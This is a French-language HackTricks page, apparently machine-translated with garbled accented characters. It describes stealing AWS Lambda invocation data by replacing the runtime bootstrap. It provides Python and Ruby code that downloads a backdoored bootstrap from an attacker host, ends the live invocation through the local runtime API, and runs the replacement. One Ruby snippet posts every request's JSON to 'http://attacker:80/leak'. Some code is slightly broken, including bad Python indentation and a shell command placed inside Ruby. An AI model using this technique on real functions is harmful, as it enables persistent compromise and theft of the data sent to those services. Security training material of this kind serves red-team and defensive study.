# AWS - Voler les requ√™tes Lambda

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introduction <a href="#python-runtime" id="python-runtime"></a>

Cette attaque suppose que vous avez un certain type d'**acc√®s sur une Lambda en cours d'ex√©cution**.\
Il est √©galement important de noter que les **invocations Lambda ne sont pas compl√®tement s√©par√©es les unes des autres mais sont isol√©es**. Elles pourraient s'ex√©cuter, bien que pas simultan√©ment, dans le m√™me environnement d'ex√©cution. Avec cela √† l'esprit, commen√ßons √† diss√©quer cet environnement.

### Isolation

L'isolation Lambda utilise ces cgroups :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Comme le pr√©fixe 'sandbox' ne correspondait √† aucun moteur de conteneur commun (docker, podman, LXD, rkt), il pourrait s'agir d'un moteur de conteneur propri√©taire, qui pourrait utiliser en interne un moteur d'ex√©cution de conteneur open source comme [runC](https://github.com/opencontainers/runc).

### Fonctionnement des Lambdas  <a href="#python-runtime" id="python-runtime"></a>

Voici ce qui semble √™tre l'architecture Lambda python :

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Un processus √† l'ext√©rieur du conteneur, appel√© le "**slicer**" dans le binaire init, envoie des √©v√©nements d'invocation au processus **init** via la m√©moire partag√©e.
2. Le processus init configure un serveur HTTP sur le port 9001 (cod√© en dur), avec plusieurs points de terminaison expos√©s :
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obtenir le prochain √©v√©nement d'invocation
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì retourner la r√©ponse du gestionnaire pour l'invocation
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì retourner une erreur d'ex√©cution
3. Dans `bootstrap.py`, la boucle suivante **interroge le processus init pour un nouvel √©v√©nement**, puis **appelle la fonction de l'utilisateur** pour le g√©rer (ici, le gestionnaire de requ√™te que vous avez t√©l√©charg√© s'ex√©cute).\

<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. La **r√©ponse du gestionnaire est ensuite renvoy√©e au processus init** via l'un des points de terminaison suivants :
   1. `/{invoke-id}/response` ‚Äì si le gestionnaire de l'utilisateur s'est ex√©cut√© avec succ√®s
   2. `/{invoke-id}/error` ‚Äì si une exception a √©t√© lev√©e pendant le traitement de l'invocation

## R√©sum√© de la technique <a href="#python-runtime" id="python-runtime"></a>

Il est possible de **substituer le script bootstrap** par du code malveillant pour pouvoir **intercepter les donn√©es** envoy√©es √† la fonction Lambda.\
Notez que **d'autres moteurs dans d'autres langues** ont un autre script **bootstrap** √©crit dans cette langue, donc cela peut √™tre fait **√©galement dans d'autres lambdas utilisant d'autres langues**, pas seulement en python.

## Python <a href="#python-runtime" id="python-runtime"></a>

Depuis la lambda, t√©l√©chargez **`/var/runtime/bootstrap.py`** (ou lancez simplement **votre propre lambda** et obtenez-le) et ajoutez le backdoor qui fera fuiter toutes les donn√©es envoy√©es √† Lambda. Vous avez juste besoin d'ajouter quelques lignes telles que :

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Remplacement du Runtime

Maintenant, avec le nouveau **`bootstrap.py` cr√©√©**, il est possible de le **t√©l√©charger**, **terminer l'invocation lambda actuelle** et l'ex√©cuter pour **remplacer** le l√©gitime :
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
Ou vous pourriez √©galement utiliser [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), qui terminera l'invocation comme pr√©c√©demment, ex√©cutera le nouveau bootstrap et exfiltrera les informations.

{% hint style="warning" %}
Si une fonction lambda n'est pas utilis√©e pendant 5 √† 15 minutes, elle sera arr√™t√©e, et tous les changements seront perdus la prochaine fois qu'elle sera invoqu√©e.
{% endhint %}

## Ruby Runtime <a href="#ruby-runtime" id="ruby-runtime"></a>

En ruby, le fichier que vous souhaitez compromettre est le fichier **`/var/runtime/lib/runtime.rb`** (obtenez-le depuis le syst√®me ou en ex√©cutant votre propre lambda).

Ajouter une porte d√©rob√©e est aussi simple que dans la version python :
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
Ensuite, vous devez simplement faire ce que vous avez fait dans la version python avec juste un changement :

* **T√©l√©chargez le backdoor dans un r√©pertoire**
* **Symlink** `/var/runtime/lib/*` avec le r√©pertoire o√π se trouve le backdoor
* Terminez l'invocation lambda actuelle
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## R√©f√©rences

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
